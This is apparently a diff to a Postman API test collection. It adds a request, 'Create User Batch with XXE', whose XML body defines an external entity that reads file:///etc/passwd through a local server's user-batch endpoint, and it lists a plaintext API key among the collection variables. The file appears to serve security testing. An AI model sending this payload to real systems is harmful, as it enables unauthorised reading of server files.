@@ -353,26 +353,65 @@
 				}
 			},
 			"response": []
+		},
+		{
+			"name": "Create User Batch with XXE",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"type": "text",
+						"value": "application/json"
+					},
+					{
+						"key": "X-Api-Key",
+						"type": "text",
+						"value": "{{valid_api_key}}"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<users>\n\t<user>\n\t\t<id>&xxe;</id>\n\t</user>\n</users>",
+					"options": {
+						"raw": {
+							"language": "xml"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{server_url}}/v1/users/batch",
+					"host": [
+						"{{server_url}}"
+					],
+					"path": [
+						"v1",
+						"users",
+						"batch"
+					]
+				}
+			},
+			"response": []
 		}
 	],
 	"variable": [
 		{
-            "id": "6c5c1258-1cb7-44b3-87eb-66c08f3eceec",
+			"id": "6c5c1258-1cb7-44b3-87eb-66c08f3eceec",
 			"key": "server_url",
 			"value": "localhost:8080"
 		},
 		{
-            "id": "ddfa56cd-6fb6-4b32-821c-e4781f732e95",
+			"id": "ddfa56cd-6fb6-4b32-821c-e4781f732e95",
 			"key": "valid_api_key",
 			"value": "cduaLgypunElZjNWpuxBJqV4E6ZFX1d4"
 		},
 		{
-            "id": "b2953709-3053-48a2-8193-eaa48d7f25ca",
+			"id": "b2953709-3053-48a2-8193-eaa48d7f25ca",
 			"key": "user_id",
 			"value": "2"
 		},
 		{
-            "id": "3d3e50db-3133-45fc-918e-0de4445f23f0",
+			"id": "3d3e50db-3133-45fc-918e-0de4445f23f0",
 			"key": "ticket_id",
 			"value": "2"
 		}
